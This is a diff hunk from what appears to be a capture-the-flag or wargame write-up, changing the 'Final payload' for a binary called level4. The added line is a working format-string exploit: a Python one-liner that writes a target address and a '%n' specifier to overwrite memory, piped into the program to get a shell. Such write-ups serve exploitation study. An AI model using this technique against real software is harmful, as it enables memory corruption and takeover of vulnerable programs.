@@ -69,7 +69,7 @@ Little-endian bytes:
 ## Final payload
 
 ```bash
-(python -c 'print "" + "%16909056d%12$n"'; cat) | ./level4
+(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'; cat) | ./level4
 ```
 
 ## Why it works
